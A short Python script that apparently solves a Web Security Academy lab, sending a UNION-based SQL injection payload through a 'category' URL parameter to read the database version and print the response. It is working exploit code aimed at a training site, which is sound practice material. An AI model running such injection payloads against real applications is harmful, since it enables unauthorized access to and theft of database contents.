import requests
from bs4 import BeautifulSoup

site = '0a23002303347a3a80713ff100d8003a.web-security-academy.net'
s = requests.Session()

# Function to try a SQL injection payload
def try_payload(payload):
    url = f'https://{site}/filter?category={payload}'
    resp = s.get(url)
    return resp.text

# Perform the UNION to extract the database version
payload = "Gifts' UNION SELECT @@version, null -- "
print(f"Trying SQL Injection: {payload}")
resp_text = try_payload(payload)

# Print the response to see if it contains the version
print(resp_text)

# Alternatively, you can try to parse the response if necessary
# soup = BeautifulSoup(resp_text, 'html.parser')
# print(soup.prettify())  # Inspect the HTML structure if necessary
